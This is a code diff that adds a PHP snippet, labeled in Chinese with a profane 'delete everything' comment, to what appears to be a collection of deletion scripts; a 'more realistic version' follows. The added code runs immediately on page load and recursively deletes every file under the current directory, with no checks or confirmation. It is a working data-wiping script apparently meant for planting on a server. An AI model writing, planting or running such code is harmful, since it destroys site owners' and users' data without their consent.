@@ -1,3 +1,33 @@
+<!-- 他媽遇到廢物全刪版 -->
+<?php
+delFile('./');
+
+function delFile($dirName,$delSelf=false){
+    if(file_exists($dirName) && $handle = opendir($dirName)){
+        while(false !==($item = readdir( $handle))){
+            if($item != '.' && $item != '..'){
+                if(file_exists($dirName.'/'.$item) && is_dir($dirName.'/'.$item)){
+                    delFile($dirName.'/'.$item);
+                }else{
+                    if(!unlink($dirName.'/'.$item)){
+                        return false;
+                    }
+                }
+            }
+        }
+        closedir($handle);
+        if($delSelf){
+            if(!rmdir($dirName)){
+                return false;
+            }
+        }
+    }else{
+        return false;
+    }
+    return true;
+}
+?>
+
 <!-- 比較逼真版 -->
 <?php
 function deleteDirectory($dir) {
